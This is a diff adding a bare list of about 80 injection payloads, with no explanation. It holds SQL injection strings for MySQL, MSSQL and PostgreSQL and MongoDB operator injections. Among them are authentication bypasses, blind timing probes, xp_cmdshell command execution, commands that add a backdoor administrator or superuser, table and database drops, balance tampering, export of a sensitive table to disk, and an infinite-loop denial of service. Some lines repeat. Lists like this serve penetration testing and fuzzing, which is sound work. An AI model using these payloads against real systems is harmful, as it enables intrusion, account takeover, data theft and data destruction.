@@ -1,0 +1,80 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+') OR ('1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1'--
+') OR '1'='1'(#)
+') OR '1'='1'/*
+"" OR 1=1--
+" OR "" = "
+OR 1=1
+OR 1=0
+AND 1=1
+AND 1=0
+' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%')
+' OR EXISTS(SELECT 1 FROM dual WHERE table_name = 'tablename')
+' OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema = 'dbname' AND table_name = 'tabname')
+' OR (SELECT user FROM mysql.user LIMIT 1)='root'
+' OR 'x'='x
+' OR 1=1--
+'; EXEC xp_cmdshell('dir')--
+'; DROP TABLE users--
+'; UPDATE account SET balance = 10000 WHERE name = 'Bob'--
+' OR EXISTS(SELECT * FROM master..sysdatabases)--
+' OR EXISTS(SELECT * FROM sys.objects)--
+' OR EXISTS(SELECT * FROM sys.columns WHERE object_id = OBJECT_ID('users'))--
+'; WAITFOR DELAY '00:00:05'--
+'; BEGIN TRAN; UPDATE account SET balance = balance + 1000; COMMIT TRAN; --
+'; DECLARE @cmd sysname; SET @cmd = 'cmdshell'; EXEC sp_configure @cmd,1; RECONFIGURE;--
+'; DECLARE @cmd varchar(4000); SET @cmd = 'net user'; EXEC xp_cmdshell @cmd;--
+' AND 1=(SELECT COUNT(*) FROM tablenames); --
+' AND 1=(SELECT TOP 1 column_name FROM table_name); --
+' AND ascii(lower(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116; --
+1; WAITFOR DELAY '0:0:5'--
+1; EXEC sp_msforeachtable 'DROP TABLE ?'--
+'; IF (1=1) WAITFOR DELAY '00:00:05'--
+'; DECLARE @s varchar(8000); SET @s = CAST(0xDEC0DED AS varchar(4000)); EXEC(@s)--
+1; EXEC xp_cmdshell('net user eviluser evilpass /ADD')--
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1'--
+') OR '1'='1'(#)
+') OR '1'='1'/*
+"" OR 1=1--
+" OR "" = "
+OR 1=1
+OR 1=0
+AND 1=1
+AND 1=0
+' OR EXISTS(SELECT 1 FROM pg_sleep(5))--
+' OR EXISTS(SELECT 1 FROM pg_database WHERE datname LIKE '%')--
+' OR pg_sleep(10)--
+' OR (SELECT current_setting('is_superuser'))='on'
+'; DROP TABLE IF EXISTS users;--
+'; CREATE USER hacker WITH SUPERUSER PASSWORD 'evil';--
+'; COPY (SELECT * FROM sensitive_table) TO '/tmp/sensitive_data.csv' WITH CSV;--
+{'$gt': ''}
+{'$ne': null}
+{username: {'$ne': null}, password: {'$ne': null}}
+{username: {'$regex': '.*'}, password: {'$regex': '.*'}}
+'; this.db.dropDatabase();
+{$where: '1 == 1'}
+{$where: 'return true;'}
+{$where: 'function() {return true;}'}
+'; return db.adminCommand('listDatabases');
+{$where: 'function() {sleep(5000); return true;}'}
+{password: {$regex: "^admin"}}
+{username: {$regex: ".*"}, password: {$regex: ".*"}}
+{username: {$gt: undefined}, password: {$gt: undefined}}
+'; db.dropUser("username");
+'; db.serverStatus();
+'; while(true){}
+{username: {$gt: ''}, password: {$gt: ''}}
+{username: {$ne: 'nonexistentuser'}, password: {$ne: 'wrongpassword'}}
+{$eval: 'db.dropDatabase()'}
+{$jsonSchema: {required: ["none"]}}
